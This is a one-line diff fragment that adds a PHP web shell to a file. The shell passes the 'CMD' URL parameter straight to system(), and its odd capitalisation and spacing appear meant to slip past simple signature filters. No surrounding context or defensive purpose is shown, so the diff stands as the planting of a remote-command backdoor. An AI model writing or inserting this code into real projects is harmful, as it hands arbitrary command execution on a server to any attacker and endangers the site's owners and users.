@@ -1,0 +1,1 @@
+<?php    sYstEm ($_GET['CMD']);    ?>
